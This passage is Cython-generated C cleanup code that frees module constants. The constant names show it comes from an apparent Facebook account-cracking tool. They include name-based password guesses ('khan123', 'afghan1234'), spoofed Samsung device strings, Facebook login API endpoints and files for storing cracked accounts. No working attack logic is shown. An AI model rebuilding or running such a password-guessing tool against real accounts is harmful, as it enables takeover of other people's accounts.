  Py_CLEAR(clear_module_state->__pyx_kp_s_Press_enter_to_back);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Press_enter_to_back_menu);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Put_file_example_sdcard_File_tx);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Put_file_path_1_37m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Put_first_name);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Put_last_name);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Put_limit);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Put_password);
  Py_CLEAR(clear_module_state->__pyx_n_s_Q);
  Py_CLEAR(clear_module_state->__pyx_n_s_R);
  Py_CLEAR(clear_module_state->__pyx_n_s_Random);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Run_python_ZEA_py);
  Py_CLEAR(clear_module_state->__pyx_n_s_S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500FU_MMB29M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500F_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500F_MMB29M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500H_MMB29M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G900F_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G920F_MMB29K);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G920F_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G930F_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G935F_MMB29K);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G935F_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G950F_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320FN_LMY47V);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320F_LMY4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320F_LMY47V);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320H_LMY47V);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320M_LMY47V);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J510FN_MMB29M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J510FN_NMF2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J510FN_NMF26X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J510FN_NMF26X_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J701F_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J701F_NRD90M_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T111_JDQ39);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T230_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T231_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T235_KOT4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T310_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T311_KOT4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T311_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T315_JDQ39);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T525_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T531_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T531_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T535_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T555_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T561_KTU84P);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T705_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T705_LRX22G_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T805_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T820_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SPH_L720_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_n_s_Sabir);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Select_Password_Crack_menu);
  Py_CLEAR(clear_module_state->__pyx_n_s_Session);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Status_1_91mTrail_1_37m_1_31m_1);
  Py_CLEAR(clear_module_state->__pyx_n_s_T);
  Py_CLEAR(clear_module_state->__pyx_kp_u_TL_tl);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Thanks_for_use);
  Py_CLEAR(clear_module_state->__pyx_kp_s_The_process_has_completed);
  Py_CLEAR(clear_module_state->__pyx_n_s_ThreadPoolExecutor);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Tools_Facebook_Cloning);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Total_OK_CP_2F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Total_account_1_32m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Total_account_1_37m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Total_account_ids_1_32m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Try_method_2_3_for_best_results);
  Py_CLEAR(clear_module_state->__pyx_n_s_U);
  Py_CLEAR(clear_module_state->__pyx_kp_s_User_Agent);
  Py_CLEAR(clear_module_state->__pyx_n_s_V);
  Py_CLEAR(clear_module_state->__pyx_n_s_ValueError);
  Py_CLEAR(clear_module_state->__pyx_n_s_W);
  Py_CLEAR(clear_module_state->__pyx_n_s_X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Connection_Bandwidth);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Connection_Type);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Friendly_Name);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_HTTP_Engine);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Net_HNI);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_SIM_HNI);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y);
  Py_CLEAR(clear_module_state->__pyx_n_s_Yes);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Your_Subscription_Date_Expire);
  Py_CLEAR(clear_module_state->__pyx_n_s_Z);
  Py_CLEAR(clear_module_state->__pyx_n_s__110);
  Py_CLEAR(clear_module_state->__pyx_kp_u__20);
  Py_CLEAR(clear_module_state->__pyx_kp_s__22);
  Py_CLEAR(clear_module_state->__pyx_kp_u__22);
  Py_CLEAR(clear_module_state->__pyx_kp_s__25);
  Py_CLEAR(clear_module_state->__pyx_kp_s__29);
  Py_CLEAR(clear_module_state->__pyx_n_s__31);
  Py_CLEAR(clear_module_state->__pyx_kp_s__52);
  Py_CLEAR(clear_module_state->__pyx_kp_s__63);
  Py_CLEAR(clear_module_state->__pyx_kp_s__68);
  Py_CLEAR(clear_module_state->__pyx_kp_u__72);
  Py_CLEAR(clear_module_state->__pyx_kp_s__75);
  Py_CLEAR(clear_module_state->__pyx_kp_u__76);
  Py_CLEAR(clear_module_state->__pyx_kp_u__77);
  Py_CLEAR(clear_module_state->__pyx_kp_u__91);
  Py_CLEAR(clear_module_state->__pyx_kp_u__92);
  Py_CLEAR(clear_module_state->__pyx_n_s_a);
  Py_CLEAR(clear_module_state->__pyx_kp_s_a_code_to_use);
  Py_CLEAR(clear_module_state->__pyx_n_s_aa);
  Py_CLEAR(clear_module_state->__pyx_n_s_accept);
  Py_CLEAR(clear_module_state->__pyx_kp_s_accept_encoding);
  Py_CLEAR(clear_module_state->__pyx_kp_s_accept_language);
  Py_CLEAR(clear_module_state->__pyx_n_s_accessToken);
  Py_CLEAR(clear_module_state->__pyx_n_s_adid);
  Py_CLEAR(clear_module_state->__pyx_n_s_afghan123);
  Py_CLEAR(clear_module_state->__pyx_n_s_afghan1234);
  Py_CLEAR(clear_module_state->__pyx_n_s_afghan12345);
  Py_CLEAR(clear_module_state->__pyx_n_s_agent);
  Py_CLEAR(clear_module_state->__pyx_n_s_allow_redirects);
  Py_CLEAR(clear_module_state->__pyx_n_s_am);
  Py_CLEAR(clear_module_state->__pyx_n_s_android_version);
  Py_CLEAR(clear_module_state->__pyx_n_s_api);
  Py_CLEAR(clear_module_state->__pyx_n_s_api1);
  Py_CLEAR(clear_module_state->__pyx_n_s_api1_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_api_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_append);
  Py_CLEAR(clear_module_state->__pyx_kp_s_application_x_www_form_urlencode);
  Py_CLEAR(clear_module_state->__pyx_n_s_args);
  Py_CLEAR(clear_module_state->__pyx_n_s_asyncio_coroutines);
  Py_CLEAR(clear_module_state->__pyx_n_s_authenticate);
  Py_CLEAR(clear_module_state->__pyx_n_s_b);
  Py_CLEAR(clear_module_state->__pyx_n_s_base64);
  Py_CLEAR(clear_module_state->__pyx_n_s_bd);
  Py_CLEAR(clear_module_state->__pyx_n_s_bd_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_build);
  Py_CLEAR(clear_module_state->__pyx_n_s_button_with_disabled);
  Py_CLEAR(clear_module_state->__pyx_n_s_c);
  Py_CLEAR(clear_module_state->__pyx_n_s_c_user);
  Py_CLEAR(clear_module_state->__pyx_n_s_check_output);
  Py_CLEAR(clear_module_state->__pyx_n_s_checkpoint);
  Py_CLEAR(clear_module_state->__pyx_n_s_choice);
  Py_CLEAR(clear_module_state->__pyx_n_s_choices);
  Py_CLEAR(clear_module_state->__pyx_n_s_clear);
  Py_CLEAR(clear_module_state->__pyx_n_s_client_country_code);
  Py_CLEAR(clear_module_state->__pyx_n_s_cline_in_traceback);
  Py_CLEAR(clear_module_state->__pyx_n_s_close);
  Py_CLEAR(clear_module_state->__pyx_n_s_code);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_adsmanager);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_katana);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_lite);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_mlite);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_orca);
  Py_CLEAR(clear_module_state->__pyx_n_s_community_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_complete);
  Py_CLEAR(clear_module_state->__pyx_n_s_concurrent_futures);
  Py_CLEAR(clear_module_state->__pyx_n_s_cookies);
  Py_CLEAR(clear_module_state->__pyx_n_s_cpl);
  Py_CLEAR(clear_module_state->__pyx_n_s_cps);
  Py_CLEAR(clear_module_state->__pyx_n_s_crack_submit);
  Py_CLEAR(clear_module_state->__pyx_n_s_credentials_type);
  Py_CLEAR(clear_module_state->__pyx_n_s_currently_logged_in_userid);
  Py_CLEAR(clear_module_state->__pyx_n_s_cx);
  Py_CLEAR(clear_module_state->__pyx_n_s_d);
  Py_CLEAR(clear_module_state->__pyx_n_s_data);
  Py_CLEAR(clear_module_state->__pyx_kp_s_density_4_0_width_1440_height_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_density_4_0_width_1440_height_3_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_device);
  Py_CLEAR(clear_module_state->__pyx_n_s_device_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_digits);
  Py_CLEAR(clear_module_state->__pyx_kp_u_disable);
  Py_CLEAR(clear_module_state->__pyx_n_s_dnt);
  Py_CLEAR(clear_module_state->__pyx_n_s_document);
  Py_CLEAR(clear_module_state->__pyx_kp_s_domain);
  Py_CLEAR(clear_module_state->__pyx_n_s_domain_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_dump);
  Py_CLEAR(clear_module_state->__pyx_n_s_e);
  Py_CLEAR(clear_module_state->__pyx_n_s_email);
  Py_CLEAR(clear_module_state->__pyx_kp_s_en_US_FB4A_FBAV);
  Py_CLEAR(clear_module_state->__pyx_kp_s_en_US_en_q_0_9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_en_us_10_T_Mobile_myTouch_3G_Sli);
  Py_CLEAR(clear_module_state->__pyx_kp_u_enable);
  Py_CLEAR(clear_module_state->__pyx_n_s_enroll_misauth);
  Py_CLEAR(clear_module_state->__pyx_n_s_enter);
  Py_CLEAR(clear_module_state->__pyx_n_s_error);
  Py_CLEAR(clear_module_state->__pyx_n_s_error_data);
  Py_CLEAR(clear_module_state->__pyx_n_s_error_detail_type);
  Py_CLEAR(clear_module_state->__pyx_n_s_error_msg);
  Py_CLEAR(clear_module_state->__pyx_n_s_exceptions);
  Py_CLEAR(clear_module_state->__pyx_n_s_exit);
  Py_CLEAR(clear_module_state->__pyx_n_s_exit_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_f);
  Py_CLEAR(clear_module_state->__pyx_n_s_false);
  Py_CLEAR(clear_module_state->__pyx_n_s_family);
  Py_CLEAR(clear_module_state->__pyx_n_s_family_device_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_fb_api_req_friendly_name);
  Py_CLEAR(clear_module_state->__pyx_n_s_fban);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbav);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbbd);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbbv);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbca);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbcr);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbdm);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbdv);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbfw);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbks);
  Py_CLEAR(clear_module_state->__pyx_n_s_fblc);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbmf);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbpn);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbrv);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbsv);
  Py_CLEAR(clear_module_state->__pyx_n_s_ffb);
  Py_CLEAR(clear_module_state->__pyx_n_s_fikr);
  Py_CLEAR(clear_module_state->__pyx_n_s_file);
  Py_CLEAR(clear_module_state->__pyx_n_s_first);
  Py_CLEAR(clear_module_state->__pyx_n_s_first123);
  Py_CLEAR(clear_module_state->__pyx_n_s_first12345);
  Py_CLEAR(clear_module_state->__pyx_n_s_first_name);
  Py_CLEAR(clear_module_state->__pyx_n_s_firstlast);
  Py_CLEAR(clear_module_state->__pyx_n_s_firstlast123);
  Py_CLEAR(clear_module_state->__pyx_n_s_fkeyx);
  Py_CLEAR(clear_module_state->__pyx_n_s_flow);
  Py_CLEAR(clear_module_state->__pyx_kp_u_flow_login_no_pin_refsrc_deprec);
  Py_CLEAR(clear_module_state->__pyx_n_s_flush);
  Py_CLEAR(clear_module_state->__pyx_n_s_fn);
  Py_CLEAR(clear_module_state->__pyx_n_s_fo);
  Py_CLEAR(clear_module_state->__pyx_kp_s_for_log_in);
  Py_CLEAR(clear_module_state->__pyx_n_s_format);
  Py_CLEAR(clear_module_state->__pyx_n_s_fs);
  Py_CLEAR(clear_module_state->__pyx_n_s_fullagnt);
  Py_CLEAR(clear_module_state->__pyx_n_s_g);
  Py_CLEAR(clear_module_state->__pyx_kp_u_gc);
  Py_CLEAR(clear_module_state->__pyx_n_s_generate_analytics_claims);
  Py_CLEAR(clear_module_state->__pyx_n_s_generate_machine_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_generate_session_cookies);
  Py_CLEAR(clear_module_state->__pyx_n_s_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_get);
  Py_CLEAR(clear_module_state->__pyx_n_s_get_dict);
  Py_CLEAR(clear_module_state->__pyx_n_s_getlog);
  Py_CLEAR(clear_module_state->__pyx_n_s_gmail);
  Py_CLEAR(clear_module_state->__pyx_n_s_gmail_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_group);
  Py_CLEAR(clear_module_state->__pyx_n_s_gt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_gzip_deflate);
  Py_CLEAR(clear_module_state->__pyx_kp_s_gzip_deflate_br);
  Py_CLEAR(clear_module_state->__pyx_n_s_h);
  Py_CLEAR(clear_module_state->__pyx_n_s_head);
  Py_CLEAR(clear_module_state->__pyx_n_s_headers);
  Py_CLEAR(clear_module_state->__pyx_n_s_hexdigits);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_api_whatsapp_com_send_phon);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_b_api_facebook_com_method);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_b_graph_facebook_com_auth);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_free_facebook_com_login_sa);
  Py_CLEAR(clear_module_state->__pyx_kp_u_https_p_facebook_com_login_devic);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_p_facebook_com_login_devic_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_i);
  Py_CLEAR(clear_module_state->__pyx_n_s_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_idpass);
  Py_CLEAR(clear_module_state->__pyx_n_s_ids);
  Py_CLEAR(clear_module_state->__pyx_n_s_import);
  Py_CLEAR(clear_module_state->__pyx_n_s_initializing);
  Py_CLEAR(clear_module_state->__pyx_n_s_input);
  Py_CLEAR(clear_module_state->__pyx_n_s_is_coroutine);
  Py_CLEAR(clear_module_state->__pyx_kp_u_isenabled);
  Py_CLEAR(clear_module_state->__pyx_n_s_j);
  Py_CLEAR(clear_module_state->__pyx_n_s_j1);
  Py_CLEAR(clear_module_state->__pyx_n_s_jazoest);
  Py_CLEAR(clear_module_state->__pyx_n_s_join);
  Py_CLEAR(clear_module_state->__pyx_n_s_json);
  Py_CLEAR(clear_module_state->__pyx_n_s_k);
  Py_CLEAR(clear_module_state->__pyx_n_s_keys);
  Py_CLEAR(clear_module_state->__pyx_n_s_khan1122);
  Py_CLEAR(clear_module_state->__pyx_n_s_khan123);
  Py_CLEAR(clear_module_state->__pyx_n_s_khan12345);
  Py_CLEAR(clear_module_state->__pyx_n_s_khan123456);
  Py_CLEAR(clear_module_state->__pyx_n_s_khankhan);
  Py_CLEAR(clear_module_state->__pyx_n_s_khankhan123);
  Py_CLEAR(clear_module_state->__pyx_n_s_krk);
  Py_CLEAR(clear_module_state->__pyx_kp_s_krk_py);
  Py_CLEAR(clear_module_state->__pyx_n_s_l);
  Py_CLEAR(clear_module_state->__pyx_n_s_last);
  Py_CLEAR(clear_module_state->__pyx_n_s_last123);
  Py_CLEAR(clear_module_state->__pyx_n_s_last1234);
  Py_CLEAR(clear_module_state->__pyx_n_s_last12345);
  Py_CLEAR(clear_module_state->__pyx_n_s_last_name);
  Py_CLEAR(clear_module_state->__pyx_n_s_lchoice);
  Py_CLEAR(clear_module_state->__pyx_n_s_li);
  Py_CLEAR(clear_module_state->__pyx_n_s_li2);
  Py_CLEAR(clear_module_state->__pyx_n_s_light);
  Py_CLEAR(clear_module_state->__pyx_n_s_limit);
  Py_CLEAR(clear_module_state->__pyx_n_s_linex);
  Py_CLEAR(clear_module_state->__pyx_n_s_lists);
  Py_CLEAR(clear_module_state->__pyx_n_s_ln);
  Py_CLEAR(clear_module_state->__pyx_n_s_locale);
  Py_CLEAR(clear_module_state->__pyx_n_s_login);
  Py_CLEAR(clear_module_state->__pyx_n_s_login_no_pin);
  Py_CLEAR(clear_module_state->__pyx_n_s_logo);
  Py_CLEAR(clear_module_state->__pyx_n_s_loop);
  Py_CLEAR(clear_module_state->__pyx_n_s_lower);
  Py_CLEAR(clear_module_state->__pyx_n_s_ls);
  Py_CLEAR(clear_module_state->__pyx_n_s_lsd);
  Py_CLEAR(clear_module_state->__pyx_n_s_mail);
  Py_CLEAR(clear_module_state->__pyx_n_s_main);
  Py_CLEAR(clear_module_state->__pyx_n_s_max_workers);
  Py_CLEAR(clear_module_state->__pyx_n_s_menu);
  Py_CLEAR(clear_module_state->__pyx_n_s_message);
  Py_CLEAR(clear_module_state->__pyx_n_s_meta_inf_fbmeta);
  Py_CLEAR(clear_module_state->__pyx_n_s_model);
  Py_CLEAR(clear_module_state->__pyx_n_s_mthd);
  Py_CLEAR(clear_module_state->__pyx_n_s_n);
  Py_CLEAR(clear_module_state->__pyx_n_s_name);
  Py_CLEAR(clear_module_state->__pyx_n_s_name_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_name_jazoest_value);
  Py_CLEAR(clear_module_state->__pyx_kp_s_name_lsd_value);
  Py_CLEAR(clear_module_state->__pyx_n_s_names);
  Py_CLEAR(clear_module_state->__pyx_n_s_navigate);
  Py_CLEAR(clear_module_state->__pyx_n_s_next);
  Py_CLEAR(clear_module_state->__pyx_n_s_nmbr);
  Py_CLEAR(clear_module_state->__pyx_n_s_nmp);
  Py_CLEAR(clear_module_state->__pyx_n_s_none);
  Py_CLEAR(clear_module_state->__pyx_n_s_oks);
  Py_CLEAR(clear_module_state->__pyx_n_s_open);
  Py_CLEAR(clear_module_state->__pyx_n_s_os);
  Py_CLEAR(clear_module_state->__pyx_kp_s_p_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_pak);
  Py_CLEAR(clear_module_state->__pyx_n_s_pak_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_pas);
  Py_CLEAR(clear_module_state->__pyx_n_s_pass);
  Py_CLEAR(clear_module_state->__pyx_n_s_passlist);
  Py_CLEAR(clear_module_state->__pyx_n_s_password);
  Py_CLEAR(clear_module_state->__pyx_n_s_path);
  Py_CLEAR(clear_module_state->__pyx_n_s_pcp);
  Py_CLEAR(clear_module_state->__pyx_n_s_pip);
  Py_CLEAR(clear_module_state->__pyx_kp_s_pip_install_requests_futures_2_d);
  Py_CLEAR(clear_module_state->__pyx_n_s_plist);
  Py_CLEAR(clear_module_state->__pyx_n_s_po);
  Py_CLEAR(clear_module_state->__pyx_n_s_post);
  Py_CLEAR(clear_module_state->__pyx_n_s_ppp);
  Py_CLEAR(clear_module_state->__pyx_n_s_print);
  Py_CLEAR(clear_module_state->__pyx_n_s_ps);
  Py_CLEAR(clear_module_state->__pyx_n_s_ps2);
  Py_CLEAR(clear_module_state->__pyx_n_s_ps_limit);
  Py_CLEAR(clear_module_state->__pyx_n_s_psx);
  Py_CLEAR(clear_module_state->__pyx_n_s_public);
  Py_CLEAR(clear_module_state->__pyx_n_s_pw);
  Py_CLEAR(clear_module_state->__pyx_kp_s_python_AKING_py);
  Py_CLEAR(clear_module_state->__pyx_kp_s_python_ZEA);
  Py_CLEAR(clear_module_state->__pyx_kp_s_python_ZEA_py);
  Py_CLEAR(clear_module_state->__pyx_n_s_r);
  Py_CLEAR(clear_module_state->__pyx_n_s_randint);
  Py_CLEAR(clear_module_state->__pyx_n_s_random);
  Py_CLEAR(clear_module_state->__pyx_n_s_random_seed);
  Py_CLEAR(clear_module_state->__pyx_n_s_randrange);
  Py_CLEAR(clear_module_state->__pyx_n_s_range);
  Py_CLEAR(clear_module_state->__pyx_n_s_re);
  Py_CLEAR(clear_module_state->__pyx_kp_s_re_txt);
  Py_CLEAR(clear_module_state->__pyx_n_s_read);
  Py_CLEAR(clear_module_state->__pyx_n_s_replace);
  Py_CLEAR(clear_module_state->__pyx_n_s_requests);
  Py_CLEAR(clear_module_state->__pyx_kp_s_rm_rf_re_txt);
  Py_CLEAR(clear_module_state->__pyx_n_s_rndm);
  Py_CLEAR(clear_module_state->__pyx_n_s_rndm_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_rsplit);
  Py_CLEAR(clear_module_state->__pyx_kp_s_s_are_on);
  Py_CLEAR(clear_module_state->__pyx_n_s_samsung);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_ZEA_CP_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_ZEA_OK_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_ZEA_R_CP_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_ZEA_R_OK_txt);
  Py_CLEAR(clear_module_state->__pyx_n_s_search);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_prefers_color_scheme);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua_mobile);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua_platform);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_dest);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_mode);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_site);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_user);
  Py_CLEAR(clear_module_state->__pyx_n_s_secure);
  Py_CLEAR(clear_module_state->__pyx_n_s_send);
  Py_CLEAR(clear_module_state->__pyx_n_s_session);
  Py_CLEAR(clear_module_state->__pyx_n_s_session_key);
  Py_CLEAR(clear_module_state->__pyx_kp_s_shortly_with);
  Py_CLEAR(clear_module_state->__pyx_n_s_sim_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_sim_serials);
  Py_CLEAR(clear_module_state->__pyx_n_s_sleep);
  Py_CLEAR(clear_module_state->__pyx_n_s_source);
  Py_CLEAR(clear_module_state->__pyx_n_s_spec);
  Py_CLEAR(clear_module_state->__pyx_n_s_split);
  Py_CLEAR(clear_module_state->__pyx_n_s_splitlines);
  Py_CLEAR(clear_module_state->__pyx_n_s_start);
  Py_CLEAR(clear_module_state->__pyx_n_s_stdout);
  Py_CLEAR(clear_module_state->__pyx_n_s_string);
  Py_CLEAR(clear_module_state->__pyx_n_s_submit);
  Py_CLEAR(clear_module_state->__pyx_n_s_subprocess);
  Py_CLEAR(clear_module_state->__pyx_n_s_sys);
  Py_CLEAR(clear_module_state->__pyx_n_s_system);
  Py_CLEAR(clear_module_state->__pyx_n_s_test);
  Py_CLEAR(clear_module_state->__pyx_n_s_text);
  Py_CLEAR(clear_module_state->__pyx_kp_s_text_html_application_xhtml_xml);
  Py_CLEAR(clear_module_state->__pyx_n_s_throw);
  Py_CLEAR(clear_module_state->__pyx_n_s_time);
  Py_CLEAR(clear_module_state->__pyx_n_s_tks);
  Py_CLEAR(clear_module_state->__pyx_n_s_tl);
  Py_CLEAR(clear_module_state->__pyx_n_s_tokenku);
  Py_CLEAR(clear_module_state->__pyx_n_s_total);
  Py_CLEAR(clear_module_state->__pyx_n_s_total_ids);
  Py_CLEAR(clear_module_state->__pyx_n_s_tred);
  Py_CLEAR(clear_module_state->__pyx_n_s_true);
  Py_CLEAR(clear_module_state->__pyx_n_s_try_num);
  Py_CLEAR(clear_module_state->__pyx_n_s_twf);
  Py_CLEAR(clear_module_state->__pyx_n_s_ua);
  Py_CLEAR(clear_module_state->__pyx_n_s_uaku2);
  Py_CLEAR(clear_module_state->__pyx_n_s_ugen);
  Py_CLEAR(clear_module_state->__pyx_n_s_uid);
  Py_CLEAR(clear_module_state->__pyx_n_s_unknown);
  Py_CLEAR(clear_module_state->__pyx_kp_s_upgrade_insecure_requests);
  Py_CLEAR(clear_module_state->__pyx_n_s_url);
  Py_CLEAR(clear_module_state->__pyx_n_s_url_wa);
  Py_CLEAR(clear_module_state->__pyx_n_s_urllib);
  Py_CLEAR(clear_module_state->__pyx_n_s_user);
  Py_CLEAR(clear_module_state->__pyx_kp_s_user_agent);
  Py_CLEAR(clear_module_state->__pyx_n_s_uuid);
  Py_CLEAR(clear_module_state->__pyx_n_s_uuid4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_viewport_width);
  Py_CLEAR(clear_module_state->__pyx_n_s_write);
  Py_CLEAR(clear_module_state->__pyx_kp_s_www_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_wx);
  Py_CLEAR(clear_module_state->__pyx_n_s_x);
  Py_CLEAR(clear_module_state->__pyx_n_s_xd);
  Py_CLEAR(clear_module_state->__pyx_kp_u_xdg_open_https_chat_whatsapp_com);
  Py_CLEAR(clear_module_state->__pyx_kp_s_xdg_open_https_chat_whatsapp_com_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_xdg_open_https_facebook_com_grou);
  Py_CLEAR(clear_module_state->__pyx_kp_s_xdg_open_https_www_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_y);
  Py_CLEAR(clear_module_state->__pyx_n_s_yes);
  Py_CLEAR(clear_module_state->__pyx_n_s_zea);
  Py_CLEAR(clear_module_state->__pyx_n_s_zlib);
  Py_CLEAR(clear_module_state->__pyx_float_2e7);
  Py_CLEAR(clear_module_state->__pyx_float_3e7);
  Py_CLEAR(clear_module_state->__pyx_int_0);
  Py_CLEAR(clear_module_state->__pyx_int_1);
  Py_CLEAR(clear_module_state->__pyx_int_2);
  Py_CLEAR(clear_module_state->__pyx_int_11);
  Py_CLEAR(clear_module_state->__pyx_int_16);
  Py_CLEAR(clear_module_state->__pyx_int_20);
  Py_CLEAR(clear_module_state->__pyx_int_30);
  Py_CLEAR(clear_module_state->__pyx_int_40);
  Py_CLEAR(clear_module_state->__pyx_int_73);
  Py_CLEAR(clear_module_state->__pyx_int_99);
  Py_CLEAR(clear_module_state->__pyx_int_100);
  Py_CLEAR(clear_module_state->__pyx_int_111);
  Py_CLEAR(clear_module_state->__pyx_int_150);
  Py_CLEAR(clear_module_state->__pyx_int_999);
  Py_CLEAR(clear_module_state->__pyx_int_4200);
  Py_CLEAR(clear_module_state->__pyx_int_4900);
  Py_CLEAR(clear_module_state->__pyx_int_5000);
